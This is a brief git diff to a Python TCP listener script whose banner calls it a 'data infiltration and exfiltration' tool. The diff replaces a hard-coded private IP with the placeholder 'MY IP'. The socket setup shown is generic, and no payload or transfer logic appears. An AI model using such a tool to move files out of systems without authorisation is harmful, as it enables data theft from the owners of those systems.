@@ -39,7 +39,7 @@ def doSend(conn, sourcePath, destinationPath, fileName):
 def connect():
     s = socket.socket()
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(("192.168.81.128", 8080))
+    s.bind(("MY IP", 8080))
     s.listen(1)
     print("=" * 60)
     print(" TCP DATA INFILTRATION AND EXFILTRATION ")
@@ -72,6 +72,7 @@ def main():
     connect()
 
 main()
+
 
 
 
